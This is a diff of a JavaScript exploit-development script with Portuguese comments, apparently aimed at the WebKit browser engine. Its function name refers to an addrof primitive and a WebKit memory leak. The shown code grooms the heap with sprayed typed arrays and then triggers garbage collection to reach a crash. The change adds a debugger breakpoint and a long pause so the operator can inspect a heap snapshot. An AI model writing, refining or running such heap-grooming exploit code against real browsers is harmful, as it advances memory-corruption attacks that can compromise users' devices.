@@ -1,9 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v02 -GC Crash Stabilized)
+// js/script3/testArrayBufferVictimCrash.mjs (v03 - GC Inspection)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// 1. Script original que causa o crash mantido na íntegra para preservar a condição.
-// 2. Ajustes mínimos para estabilizar o crash do GC, transformando-o de fatal para
-//    potencialmente controlável, sem alterar a lógica do teste.
+// 1. Script original mantido.
+// 2. Adicionado um breakpoint de depuração e uma pausa longa para permitir a inspeção
+//    manual do heap snapshot antes que o crash do GC ocorra.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -250,15 +250,21 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             for (let i = 0; i < NUM_FILLER_OBJECTS_STAGE1; i++) { filler_objects.push(new Uint32Array(Math.floor(Math.random() * 64) + 16)); }
             logS3(`  [Grooming p/ Tentativa ${grooming_id}] Spray de fillers concluído.`, "debug");
             
-            // <-- MUDANÇA: Limpeza explícita dos arrays de grooming para melhorar a estabilidade do GC.
             aggressive_feng_shui_objects.length = 0; 
             aggressive_feng_shui_objects = null;
             filler_objects.length = 0;
             filler_objects = null;
             
             logS3(`  [Grooming p/ Tentativa ${grooming_id}] Pausando para acionar GC...`, "debug");
-            // <-- MUDANÇA: Pausa do GC reduzida de 10000ms para 1500ms para diminuir a agressividade e evitar crash fatal.
-            await PAUSE_S3(5000);
+            logS3(`  !!!!!!!!!! PONTO DE INSPEÇÃO DO GC !!!!!!!!!!!`, "critical");
+            logS3(`  !!!!!!!!!! ABRA O DEVTOOLS (F12), VÁ PARA A ABA 'SOURCES' E PRESSIONE 'RESUME' (F8) !!!!!!!!!!!`, "critical");
+            logS3(`  !!!!!!!!!! A EXECUÇÃO PAUSARÁ NO BREAKPOINT. USE A ABA 'MEMORY' PARA TIRAR UM HEAP SNAPSHOT !!!!!!!!!!!`, "critical");
+
+            // <-- MUDANÇA: Breakpoint inserido para pausar a execução no depurador do navegador.
+            debugger; 
+
+            // <-- MUDANÇA: Pausa aumentada para 30 segundos para dar tempo para inspeção manual do heap.
+            await PAUSE_S3(30000); 
             logS3(`  [Grooming p/ Tentativa ${grooming_id}] Concluído.`, "debug");
         };
          if (testes_ativos.tentativa_5_ClassInfo) {
